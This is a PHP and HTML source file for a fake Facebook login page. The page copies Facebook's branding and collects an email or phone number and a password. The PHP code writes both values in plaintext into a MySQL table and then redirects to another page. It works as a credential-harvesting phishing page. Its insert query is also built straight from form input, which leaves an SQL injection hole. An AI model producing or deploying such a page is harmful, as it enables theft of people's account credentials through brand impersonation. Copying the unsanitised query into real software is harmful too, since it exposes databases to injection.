<?php
include('connection.php');
if(isset($_POST['re']))
{
    $inp3 = $_POST['na'];
    $inp4 = $_POST['pa'];
  if($inp3== ""| $inp4== ""){

echo 'Please fill full Form';
  }

  else{
      if($inp3 && $inp4){

        $var=mysqli_query($con,"INSERT INTO `mytable`( `email/phone number`, `password`) VALUES ('$inp3','$inp4')");
    
        if($var){
        
          echo ' connected';
          header('location:data.php');
        }
        else{
          echo ' not connected';
        }
        
      };

  };


    // if($con){
    //     echo "connected";

    // }
    //   else{
    //         echo "not connected";
    //   } 



}





?>






<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>hello world</title>
    
</head>
<body>
<div class="p-20 h-screen w-screen flex flex-col-reverse md:flex-row items-center justify-center bg-gray-200">
  <div class="content text-3xl text-center md:text-left">
    <h1 class="text-5xl text-blue-500 font-bold">Facebook</h1>
    <p>Connect with friends and the world around you on Facebook.</p>
  </div>
  <div class="container mx-auto flex flex-col items-center">
    <form method="POST" class="shadow-lg w-80 p-4 flex flex-col bg-white rounded-lg">
      <input type="text" placeholder="Email or Phone Number" class="mb-3 py-3 px-4 border border-gray-400 focus:outline-none rounded-md focus:ring-1 ring-cyan-500"  name="na"/>
      <input type="text" placeholder="Pasword" class="mb-3 py-3 px-4 border border-gray-400 focus:outline-none rounded-md focus:ring-1 ring-cyan-500" name="pa" />
      <button class="w-full bg-blue-500 text-white p-3 rounded-lg font-semibold text-lg" name="re"  type="submit">Login</button>
      <a class="text-blue-400 text-center my-2">Forgot Pasword?</a>
      <hr />
      <button class="w-full bg-green-400 mt-8 mb-4 text-white p-3 rounded-lg font-semibold text-lg">Create New Account</button>
    </form>
    <p class="text-center text-sm my-4">
      <span class="font-semibold text-center w-full">Create a Page</span> for a celebrity, band or business
    </p>
  </div>
</div>
</body>
</html>